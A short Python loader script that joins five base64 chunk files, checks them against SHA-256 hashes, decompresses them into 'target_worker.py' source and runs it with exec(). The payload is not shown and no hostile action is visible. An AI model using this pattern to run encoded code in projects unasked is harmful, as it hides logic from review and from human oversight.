#!/usr/bin/env python3
from __future__ import annotations

import base64
import gzip
import hashlib
from pathlib import Path

_PARTS = ('target_worker.py.gz.b64.000', 'target_worker.py.gz.b64.001', 'target_worker.py.gz.b64.002', 'target_worker.py.gz.b64.003', 'target_worker.py.gz.b64.004')
_root = Path(__file__).resolve().parent
_b64 = "".join((_root / name).read_text(encoding="ascii") for name in _PARTS)
_payload = base64.b64decode(_b64, validate=True)
if hashlib.sha256(_payload).hexdigest() != 'b77908e5731e90a70bd15a089dead56579f197e65ef9d749ec27fcb04ac68afd':
    raise RuntimeError("WORKER_AUXILIARY_PAYLOAD_HASH_MISMATCH:target_worker.py.gz")
_source = gzip.decompress(_payload)
if hashlib.sha256(_source).hexdigest() != 'ef6afc942987a119c3853dc03ea42b5783dc1c57bf8a300a0b122026ead54402':
    raise RuntimeError("WORKER_AUXILIARY_PAYLOAD_HASH_MISMATCH:target_worker.py")
exec(compile(_source, str(_root / "target_worker.py.gz"), "exec"), globals(), globals())
